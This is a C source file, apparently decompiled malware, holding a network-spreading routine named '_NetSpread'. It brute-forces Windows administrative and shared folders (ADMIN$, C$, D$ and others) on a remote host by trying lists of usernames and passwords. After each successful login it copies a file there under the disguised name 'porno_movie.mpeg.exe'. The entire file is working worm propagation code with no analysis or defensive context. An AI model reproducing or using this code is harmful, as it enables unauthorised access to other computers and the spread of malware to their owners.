#include "data_globals.h"
#include <stdio.h>
#include <string.h>

#pragma optimize("", off)
void _NetSpread(uint32_t param_1, LPCSTR param_2)
{
    volatile struct _LocalCtx {
        NETRESOURCEA net_inf;
        char nb_remote[MAX_PATH];
        char *share_name[7];
        DWORD ret;
        DWORD share_cnt;
        DWORD users_cnt;
        DWORD pwd_cnt;
    } ctx;

    // Initialize share_name array after struct instantiation
    ctx.share_name[0] = "SharedDocs";
    ctx.share_name[1] = "ADMIN$";
    ctx.share_name[2] = "C$";
    ctx.share_name[3] = "D$";
    ctx.share_name[4] = "E$";
    ctx.share_name[5] = "C";
    ctx.share_name[6] = "D";

    for (ctx.share_cnt = 0; ctx.share_cnt < 7; ctx.share_cnt++)
    {
        for (ctx.users_cnt = 0; ctx.users_cnt < USERS_NUM; ctx.users_cnt++)
        {
            for (ctx.pwd_cnt = 0; ctx.pwd_cnt < PWD_NUM; ctx.pwd_cnt++)
            {
                memset(ctx.nb_remote, 0, MAX_PATH);
                sprintf(ctx.nb_remote, "%s\\%s", (char *)param_1, ctx.share_name[ctx.share_cnt]);

                memset(&ctx.net_inf, 0, sizeof(ctx.net_inf));
                ctx.net_inf.dwDisplayType = RESOURCETYPE_ANY;
                ctx.net_inf.lpRemoteName = ctx.nb_remote;
                ctx.net_inf.lpLocalName = NULL;
                ctx.net_inf.lpProvider = NULL;

                ctx.ret = WNetAddConnection2A(&ctx.net_inf,
                                              passwords_list[ctx.pwd_cnt],
                                              users_list[ctx.users_cnt],
                                              0);

                if (ctx.ret == NO_ERROR)
                {
                    strcat(ctx.nb_remote, "\\porno_movie.mpeg.exe");
                    CopyFileA(param_2, ctx.nb_remote, FALSE);

                    memset(ctx.nb_remote, 0, MAX_PATH);
                    sprintf(ctx.nb_remote, "%s\\%s", (char *)param_1, ctx.share_name[ctx.share_cnt]);
                    WNetCancelConnectionA(ctx.nb_remote, TRUE);
                }
            }
        }
    }
}
#pragma optimize("", on)
